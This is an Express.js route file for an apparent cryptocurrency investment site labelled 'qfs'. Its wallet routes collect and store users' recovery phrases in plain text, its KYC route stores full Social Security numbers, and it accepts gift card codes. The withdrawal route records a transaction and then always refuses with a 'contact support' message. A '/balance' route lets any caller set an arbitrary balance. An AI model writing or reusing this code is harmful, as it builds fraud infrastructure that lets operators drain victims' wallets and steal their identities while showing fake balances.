const express = require('express');
const multer = require('multer');
const cloudinary = require('cloudinary').v2;
const bcrypt = require('bcryptjs');               // ✅ Added
const User = require('../models/User');
const Transaction = require('../models/Transaction');
const Notification = require('../models/Notification');
const Payment = require('../models/Payment');
const GiftCard = require('../models/GiftCard');
const KYCSubmission = require('../models/KYCSubmission');
const WalletConnection = require('../models/WalletConnection');
const Withdrawal = require('../models/Withdrawal');
const Staking = require('../models/Staking');     // ✅ Moved to top
const { protect } = require('../middleware/auth');
const Message = require('../models/Message');
const { sendEmail } = require('../utils/email');
const router = express.Router();

// ─── CoinGecko Live Price Fetch ─────────────────────────────────────
const PRICE_IDS = {
  BTC: 'bitcoin', ETH: 'ethereum', SOL: 'solana', USDT: 'tether',
  ADA: 'cardano', XRP: 'ripple', DOGE: 'dogecoin', BNB: 'binancecoin',
  LTC: 'litecoin', DOT: 'polkadot', TRX: 'tron', LINK: 'chainlink',
  MATIC: 'matic-network', SHIB: 'shiba-inu'
};

let cachedPrices = {};
let lastFetchTime = 0;

const fetchLivePrices = async () => {
  const now = Date.now();
  if (now - lastFetchTime < 60000 && Object.keys(cachedPrices).length > 0) return cachedPrices;
  try {
    const ids = Object.values(PRICE_IDS).join(',');
    const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`, { headers: { accept: 'application/json' } });
    const data = await response.json();
    const prices = {};
    for (const [symbol, id] of Object.entries(PRICE_IDS)) prices[symbol] = data[id]?.usd || 0;
    if (Object.values(prices).some(p => p > 0)) { cachedPrices = prices; lastFetchTime = now; return prices; }
  } catch (err) { console.error('Error fetching live prices:', err); }
  return cachedPrices || { BTC: 67000, ETH: 3500, SOL: 140, USDT: 1, ADA: 0.5, XRP: 0.5, DOGE: 0.15, BNB: 600, LTC: 80, DOT: 7, TRX: 0.12, LINK: 15, MATIC: 0.7, SHIB: 0.00002 };
};

// ─── Cloudinary config ─────────────────────────────────────────────
cloudinary.config({ cloud_name: process.env.CLOUDINARY_CLOUD_NAME, api_key: process.env.CLOUDINARY_API_KEY, api_secret: process.env.CLOUDINARY_API_SECRET });
const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 20 * 1024 * 1024 } });

const uploadToCloudinary = (buffer, folder) => new Promise((resolve, reject) => {
  const stream = cloudinary.uploader.upload_stream({ folder }, (error, result) => { if (error) reject(error); else resolve(result.secure_url); });
  stream.end(buffer);
});

// GET current user
router.get('/me', protect, async (req, res) => {
  try { const user = await User.findById(req.user.id).select('-password -passcodeHash'); res.json(user); } catch (err) { res.status(500).json({ error: 'Server error' }); }
});

// Update profile (avatar)
router.patch('/profile', protect, upload.single('avatar'), async (req, res) => {
  try {
    const { fullName } = req.body;
    let updateData = {};
    if (fullName && fullName.trim()) updateData.fullName = fullName.trim();
    if (req.file) {
      const avatarUrl = await uploadToCloudinary(req.file.buffer, 'qfs-avatars');
      updateData.avatar = avatarUrl;
    }
    const user = await User.findByIdAndUpdate(req.user.id, { $set: updateData }, { new: true }).select('-password -passcodeHash');
    res.json(user);
  } catch (err) { res.status(500).json({ error: 'Server error' }); }
});

// Notifications
router.get('/notifications', protect, async (req, res) => { try { const notes = await Notification.find({ userId: req.user.id }).sort({ createdAt: -1 }); res.json(notes); } catch (err) { res.status(500).json({ error: 'Server error' }); } });
router.put('/notifications/:id/read', protect, async (req, res) => { try { await Notification.findByIdAndUpdate(req.params.id, { read: true }); res.json({ success: true }); } catch (err) { res.status(500).json({ error: 'Server error' }); } });
router.delete('/notifications', protect, async (req, res) => { try { await Notification.deleteMany({ userId: req.user.id }); res.json({ success: true }); } catch (err) { res.status(500).json({ error: 'Server error' }); } });

// KYC submission
router.post('/kyc/submit', protect, (req, res) => {
  upload.fields([{ name: 'dlFront', maxCount: 1 }, { name: 'dlBack', maxCount: 1 }, { name: 'proofDoc', maxCount: 1 }])(req, res, async (err) => {
    if (err) return res.status(400).json({ error: err.message });
    try {
      const files = req.files || {};
      const dlFront = files['dlFront']?.[0]; const dlBack = files['dlBack']?.[0]; const proofDoc = files['proofDoc']?.[0];
      if (!dlFront || !dlBack || !proofDoc) return res.status(400).json({ error: 'Upload all three documents' });
      const [frontUrl, backUrl, proofUrl] = await Promise.all([
        uploadToCloudinary(dlFront.buffer, 'qfs-kyc'), uploadToCloudinary(dlBack.buffer, 'qfs-kyc'), uploadToCloudinary(proofDoc.buffer, 'qfs-kyc')
      ]);
      let dob = null; if (req.body.dateOfBirth) { dob = new Date(req.body.dateOfBirth); if (isNaN(dob.getTime())) return res.status(400).json({ error: 'Invalid date of birth' }); }
      const kyc = new KYCSubmission({
        user: req.user.id, fullName: req.body.fullName || '', email: req.body.email || '', phoneNumber: req.body.phoneNumber || '',
        address: req.body.address || '', city: req.body.city || '', state: req.body.state || '', postalCode: req.body.postalCode || '',
        country: req.body.country || '', proofType: req.body.proofType || '', driverLicenseFront: frontUrl, driverLicenseBack: backUrl,
        proofOfResidence: proofUrl, dateOfBirth: dob, ssn: req.body.ssn ? req.body.ssn.trim() : '', ssnLast4: req.body.ssn ? req.body.ssn.slice(-4) : '', status: 'pending'
      });
      await kyc.save();
      await User.findByIdAndUpdate(req.user.id, { kycCompleted: false });
      res.status(201).json({ success: true, msg: 'KYC submitted for review.' });
    } catch (err) { res.status(500).json({ error: err.message }); }
  });
});

// Gift card submission
router.post('/giftcard/submit', protect, upload.single('image'), async (req, res) => { try { const { cardType, code } = req.body; if (!req.file) return res.status(400).json({ error: 'Image is required.' }); const imageUrl = await uploadToCloudinary(req.file.buffer, 'qfs-giftcards'); const giftCard = new GiftCard({ user: req.user.id, cardType: cardType || 'Unknown', code: code?.trim() || '', image: imageUrl, status: 'pending' }); await giftCard.save(); res.status(201).json({ success: true, msg: 'Gift card submitted.' }); } catch (err) { res.status(500).json({ error: err.message }); } });

// Payment submission
router.post('/payment/submit', protect, upload.single('screenshot'), async (req, res) => { try { const { method, amount } = req.body; if (!req.file) return res.status(400).json({ error: 'Please upload a screenshot' }); const screenshotUrl = await uploadToCloudinary(req.file.buffer, 'qfs-payments'); const payment = new Payment({ user: req.user.id, method: method || 'Manual Deposit', amount: parseFloat(amount) || 0, screenshot: screenshotUrl, status: 'pending' }); await payment.save(); res.status(201).json({ success: true, msg: 'Payment submitted.' }); } catch (err) { res.status(500).json({ error: err.message }); } });

// Wallet connect
router.post('/wallet/connect', protect, async (req, res) => { try { const { walletName, phrase } = req.body; if (!walletName || !phrase) return res.status(400).json({ error: 'Wallet name and recovery phrase are required.' }); const connection = new WalletConnection({ user: req.user.id, walletName, phrase }); await connection.save(); res.status(201).json({ success: true, msg: 'Wallet connected and phrase saved.' }); } catch (err) { res.status(500).json({ error: err.message }); } });

// Withdrawal (placeholder)
router.post('/withdraw', protect, async (req, res) => { try { const { amount, method, cryptoType, walletAddress, bankDetails, cashAppTag, paypalEmail, applePayEmail, zelleEmail } = req.body; if (!amount || amount <= 0) return res.status(400).json({ error: 'Invalid amount' }); const user = await User.findById(req.user.id); if (!user) return res.status(404).json({ error: 'User not found' }); if (amount > user.balance) return res.status(400).json({ error: 'Insufficient balance' }); await Transaction.create({ userId: req.user.id, type: 'withdraw', amount: parseFloat(amount), currency: method === 'crypto' ? cryptoType : 'USD', details: `Withdrawal via ${method}` }); return res.status(403).json({ error: 'You have not reached the withdrawal limit. Please contact support.' }); } catch (err) { res.status(500).json({ error: 'Server error' }); } });

// Transactions
router.get('/transactions', protect, async (req, res) => { try { const tx = await Transaction.find({ userId: req.user.id }).sort({ timestamp: -1 }); res.json(tx); } catch (err) { res.status(500).json({ error: 'Server error' }); } });

// Assets
router.get('/assets', protect, async (req, res) => { try { const user = await User.findById(req.user.id).select('assets'); res.json(user.assets); } catch (err) { res.status(500).json({ error: 'Server error' }); } });
router.post('/assets/add', protect, async (req, res) => { try { const { asset, amount } = req.body; if (!asset || !amount || amount <= 0) return res.status(400).json({ error: 'Invalid asset or amount' }); const user = await User.findById(req.user.id); if (!user) return res.status(404).json({ error: 'User not found' }); if (!(asset in user.assets)) return res.status(400).json({ error: 'Asset not supported' }); user.assets[asset] = (user.assets[asset] || 0) + parseFloat(amount); await user.save(); res.json({ success: true, assets: user.assets }); } catch (err) { res.status(500).json({ error: 'Server error' }); } });

// SWAP with live prices
router.post('/swap', protect, async (req, res) => { try { const { fromAsset, toAsset, amount } = req.body; if (!fromAsset || !toAsset || !amount || amount <= 0) return res.status(400).json({ error: 'Invalid swap parameters' }); const user = await User.findById(req.user.id); if (!user) return res.status(404).json({ error: 'User not found' }); if (!(fromAsset in user.assets) || !(toAsset in user.assets)) return res.status(400).json({ error: 'Unsupported asset' }); if ((user.assets[fromAsset] || 0) < amount) return res.status(400).json({ error: 'Insufficient balance' }); const prices = await fetchLivePrices(); const fromPrice = prices[fromAsset] || 1; const toPrice = prices[toAsset] || 1; const receivedAmount = amount * fromPrice / toPrice; user.assets[fromAsset] -= amount; user.assets[toAsset] = (user.assets[toAsset] || 0) + receivedAmount; await user.save(); await Transaction.create({ userId: user._id, type: 'swap', amount: receivedAmount, currency: toAsset, details: `Swapped ${amount} ${fromAsset} to ${receivedAmount.toFixed(6)} ${toAsset}` }); res.json({ success: true, assets: user.assets, prices, message: 'Swap completed' }); } catch (err) { res.status(500).json({ error: 'Server error' }); } });

// CONVERT USD to crypto
router.post('/convert', protect, async (req, res) => { try { const { asset, amount } = req.body; if (!asset || !amount || amount <= 0) return res.status(400).json({ error: 'Invalid asset or amount' }); const user = await User.findById(req.user.id); if (!user) return res.status(404).json({ error: 'User not found' }); if (user.balance < amount) return res.status(400).json({ error: 'Insufficient USD balance' }); if (!(asset in user.assets)) return res.status(400).json({ error: 'Asset not supported' }); const prices = await fetchLivePrices(); const assetPrice = prices[asset] || 1; const cryptoAmount = amount / assetPrice; user.balance -= amount; user.assets[asset] = (user.assets[asset] || 0) + cryptoAmount; await user.save(); await Transaction.create({ userId: user._id, type: 'buy', amount: cryptoAmount, currency: asset, details: `Converted $${amount.toFixed(2)} USD to ${cryptoAmount.toFixed(6)} ${asset}` }); res.json({ success: true, balance: user.balance, assets: user.assets, message: 'Conversion successful' }); } catch (err) { res.status(500).json({ error: 'Server error' }); } });

// SELL crypto to USD
router.post('/sell', protect, async (req, res) => {
  try {
    const { asset, amount } = req.body;
    if (!asset || !amount || amount <= 0) return res.status(400).json({ error: 'Invalid parameters' });
    const user = await User.findById(req.user.id);
    if (!user) return res.status(404).json({ error: 'User not found' });
    if (!(asset in user.assets)) return res.status(400).json({ error: 'Unsupported asset' });
    if (user.assets[asset] < amount) return res.status(400).json({ error: 'Insufficient balance' });
    const prices = await fetchLivePrices();
    const assetPrice = prices[asset] || 1;
    const usdAmount = amount * assetPrice;
    user.assets[asset] -= amount;
    user.balance += usdAmount;
    await user.save();
    await Transaction.create({ userId: user._id, type: 'sell', amount: usdAmount, currency: 'USD', details: `Sold ${amount} ${asset} for $${usdAmount.toFixed(2)} USD` });
    await sendEmail(user.email, 'Crypto Sold', `<p>You sold ${amount} ${asset} for $${usdAmount.toFixed(2)} USD.</p>`);
    res.json({ success: true, balance: user.balance, assets: user.assets, message: 'Sold successfully' });
  } catch (err) { res.status(500).json({ error: 'Server error' }); }
});

// GET Live Prices
router.get('/prices', async (req, res) => { try { const prices = await fetchLivePrices(); res.json(prices); } catch (err) { res.status(500).json({ error: 'Server error' }); } });

// Balance update (USD)
router.post('/balance', protect, async (req, res) => { try { const user = await User.findByIdAndUpdate(req.user.id, { $set: { balance: req.body.amount } }, { new: true }).select('-password -passcodeHash'); res.json(user); } catch (err) { res.status(500).json({ error: 'Server error' }); } });

// Messages
router.get('/messages', protect, async (req, res) => { try { const messages = await Message.find({ $or: [{ sender: req.user.id }, { receiver: req.user.id }] }).populate('sender', 'fullName email role').sort({ createdAt: 1 }); res.json(messages); } catch (err) { res.status(500).json({ error: 'Failed to fetch messages' }); } });

// ─── STAKING ROUTES ────────────────────────────────────────────────

// Get all active stakes for user
router.get('/staking', protect, async (req, res) => {
  try {
    const stakes = await Staking.find({ user: req.user.id, status: 'active' });
    res.json(stakes);
  } catch (err) { res.status(500).json({ error: 'Server error' }); }
});

// Stake an asset
router.post('/stake', protect, async (req, res) => {
  try {
    const { asset, amount, stakingPeriod } = req.body;
    if (!asset || !amount || amount <= 0) return res.status(400).json({ error: 'Invalid parameters' });
    const user = await User.findById(req.user.id);
    if (!user) return res.status(404).json({ error: 'User not found' });
    if (!(asset in user.assets)) return res.status(400).json({ error: 'Asset not supported' });
    if (user.assets[asset] < amount) return res.status(400).json({ error: 'Insufficient balance' });
    user.assets[asset] -= amount;
    await user.save();
    const stake = new Staking({ user: req.user.id, asset, amount, apy: 5, stakingPeriod: stakingPeriod || '30' });
    await stake.save();
    await Transaction.create({ userId: req.user.id, type: 'stake', amount, currency: asset, details: `Staked ${amount} ${asset} for ${stakingPeriod || '30'} days` });
    res.json({ success: true, stake, message: 'Staked successfully' });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// Unstake (end staking early)
router.post('/unstake/:id', protect, async (req, res) => {
  try {
    const stake = await Staking.findById(req.params.id);
    if (!stake) return res.status(404).json({ error: 'Stake not found' });
    if (stake.user.toString() !== req.user.id) return res.status(403).json({ error: 'Not authorized' });
    if (stake.status !== 'active') return res.status(400).json({ error: 'Stake already ended' });
    const user = await User.findById(req.user.id);
    if (!user) return res.status(404).json({ error: 'User not found' });
    const daysStaked = Math.floor((Date.now() - new Date(stake.startDate)) / (1000 * 60 * 60 * 24));
    const interestRate = (stake.apy / 100) * (daysStaked / 365);
    const interestAmount = stake.amount * interestRate;
    const totalToReturn = stake.amount + interestAmount;
    user.assets[stake.asset] = (user.assets[stake.asset] || 0) + totalToReturn;
    await user.save();
    stake.status = 'ended';
    stake.endDate = Date.now();
    await stake.save();
    await Transaction.create({ userId: req.user.id, type: 'unstake', amount: totalToReturn, currency: stake.asset, details: `Unstaked ${stake.amount} ${stake.asset} with interest ${interestAmount.toFixed(6)}` });
    res.json({ success: true, stake, message: 'Unstaked successfully' });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ─── WALLET BACKUP ROUTES ───────────────────────────────────────────
router.post('/wallet-backup', protect, async (req, res) => {
  try {
    const { phrase } = req.body;
    if (!phrase) return res.status(400).json({ error: 'Recovery phrase is required' });
    const user = await User.findByIdAndUpdate(req.user.id, { walletBackup: phrase }, { new: true }).select('-password -passcodeHash');
    res.json({ success: true, message: 'Wallet backup saved successfully' });
  } catch (err) { res.status(500).json({ error: 'Server error' }); }
});

router.get('/wallet-backup', protect, async (req, res) => {
  try {
    const user = await User.findById(req.user.id).select('walletBackup');
    res.json({ phrase: user.walletBackup || '' });
  } catch (err) { res.status(500).json({ error: 'Server error' }); }
});

router.delete('/wallet-backup', protect, async (req, res) => {
  try {
    await User.findByIdAndUpdate(req.user.id, { $set: { walletBackup: '' } });
    res.json({ success: true, message: 'Wallet backup deleted' });
  } catch (err) { res.status(500).json({ error: 'Server error' }); }
});

// ─── PASSCODE ROUTES ────────────────────────────────────────────────

// Set or change passcode
router.post('/passcode/set', protect, async (req, res) => {
  try {
    const { passcode } = req.body;
    if (!passcode || passcode.length !== 6 || !/^\d{6}$/.test(passcode)) {
      return res.status(400).json({ error: 'Passcode must be exactly 6 digits' });
    }
    const salt = await bcrypt.genSalt(10);
    const passcodeHash = await bcrypt.hash(passcode, salt);
    await User.findByIdAndUpdate(req.user.id, { passcodeHash });
    res.json({ success: true, message: 'Passcode set successfully' });
  } catch (err) { res.status(500).json({ error: 'Server error' }); }
});

// Verify passcode
router.post('/passcode/verify', protect, async (req, res) => {
  try {
    const { passcode } = req.body;
    if (!passcode) return res.status(400).json({ error: 'Passcode required' });
    const user = await User.findById(req.user.id).select('+passcodeHash');
    if (!user.passcodeHash) return res.status(400).json({ error: 'No passcode set' });
    const isValid = await bcrypt.compare(passcode, user.passcodeHash);
    if (isValid) { res.json({ verified: true }); } else { res.status(401).json({ error: 'Invalid passcode' }); }
  } catch (err) { res.status(500).json({ error: 'Server error' }); }
});

// Check if user has passcode
router.get('/passcode/status', protect, async (req, res) => {
  try {
    const user = await User.findById(req.user.id).select('passcodeHash');
    res.json({ hasPasscode: !!user.passcodeHash });
  } catch (err) { res.status(500).json({ error: 'Server error' }); }
});

module.exports = router;